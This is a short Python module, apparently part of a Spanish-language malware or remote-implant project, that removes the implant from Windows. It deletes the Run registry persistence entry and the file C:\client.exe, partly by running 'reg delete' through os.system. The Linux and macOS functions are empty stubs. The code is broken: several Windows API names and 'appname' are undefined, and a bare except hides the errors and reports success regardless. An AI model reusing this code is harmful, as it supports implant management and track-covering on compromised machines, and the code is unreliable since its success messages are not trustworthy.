
# MODULO PARA AUTOREMOVER EL MALWARE -> CREADO POR KIRARI

import os

def windows_autoremover():

	try:
		from win32api import RegOpenKeyEx

		try:

			SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

			key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SUBKEY, 0, KEY_WRITE)
			RegDeleteValue(key, appname)
			RegCloseKey(key)

		except WindowsError:
			return (False,"\n No se ha podido eliminar al bicho \n")

		return (True,"\n Bicho eliminado con exito \n")

	except:
		destino = "C:\\client.exe"
		if os.path.isfile(destino):
			os.remove(destino)
		
		os.system('reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /f')

		return (True,"\n Bicho eliminado con exito \n")


def linux_autoremover():
	return (False,"\n No se ha encontrado un bicho implantado todavia \n")

def mac_autoremover():
	return (False,"\n No se ha encontrado un bicho implantado todavia \n")


def activar(plataforma):

	if plataforma=="win":
		proceso,msg = windows_autoremover()
		return proceso,msg

	elif plataforma=="linux":
		proceso,msg = linux_autoremover()
		return proceso,msg

	elif plataforma=="darwin":
		proceso,msg = mac_autoremover()
		return proceso,msg

	else:
		return (False," \nNo se ha detectado a la especie buscada\n")